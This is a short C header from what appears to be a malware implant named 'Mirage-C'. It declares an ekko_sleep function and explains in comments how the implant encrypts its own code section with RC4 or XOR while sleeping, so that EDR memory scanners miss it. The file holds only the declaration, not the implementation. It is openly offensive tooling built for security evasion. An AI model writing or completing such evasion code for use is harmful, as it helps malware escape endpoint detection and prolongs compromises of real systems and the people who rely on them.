/*
 * sleep_obfusc.h — Ekko-style sleep obfuscation for Mirage-C
 *
 * Encrypts .text section during Sleep() calls to hide from
 * EDR memory scanners. Uses SystemFunction032 (advapi32.dll
 * RC4) for encryption, falls back to XOR if unavailable.
 *
 * Only the calling page is excluded from encryption so the
 * sleep+decrypt path can execute. Coverage is ~97-99% of .text.
 */
#ifndef MIRAGE_SLEEP_OBFUSC_H
#define MIRAGE_SLEEP_OBFUSC_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * ekko_sleep — Obfuscated sleep: encrypt .text, sleep, decrypt.
 *
 * Replaces Sleep()/g_main_k32.pSlp(). CRT-free, PEB-walk only.
 *
 * Returns 1 on success, 0 on failure (falls through to Sleep).
 */
int ekko_sleep(DWORD milliseconds);

#ifdef __cplusplus
}
#endif

#endif /* MIRAGE_SLEEP_OBFUSC_H */
